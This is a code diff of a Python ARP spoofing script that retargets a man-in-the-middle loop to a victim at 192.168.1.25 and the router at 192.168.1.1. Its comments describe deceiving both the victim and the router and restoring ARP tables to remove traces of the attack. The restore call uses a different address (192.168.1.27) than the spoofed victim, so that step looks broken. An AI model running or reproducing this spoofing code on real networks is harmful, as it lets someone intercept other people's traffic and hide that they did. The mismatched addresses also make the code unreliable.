@@ -10,6 +10,7 @@ def getMac(ip):
     #sending the packet, 
     #timeout is for waiting and exiting the function or else it will be stuck in a loop
     #verbose is set to false so the output will be a little clean
+    # print(answeredList[0][1].hwsrc)
     return answeredList[0][1].hwsrc
 
 def spoof(target_ip, spoof_ip):
@@ -35,14 +36,14 @@ def restore(destination_ip, source_ip):
 send_packets_count = 0
 try: # handling the error of control c
     while True:
-        spoof("192.168.204.128", "192.168.204.2") # making the victim believe we are the router
-        spoof("192.168.204.2","192.168.204.128") # making the router beleive we are the victim.
+        spoof("192.168.1.25", "192.168.1.1") # making the victim believe we are the router
+        spoof("192.168.1.1","192.168.1.25") # making the router beleive we are the victim.
         send_packets_count = send_packets_count + 2
         print("\r[+] Sent packets " + str(send_packets_count), end="")
         time.sleep(2)
 except KeyboardInterrupt:
     print("\n[-] Detected CTRL + C ... Resetting ARP tables... Please Wait.\n")
-    restore("192.168.204.2", "192.168.204.128") # restoring the arp tables to remove traces of the man in the middle attack
+    restore("192.168.1.1", "192.168.1.27") # restoring the arp tables to remove traces of the man in the middle attack
     print("[+] ARP Table restored. Quitting...")
     
 
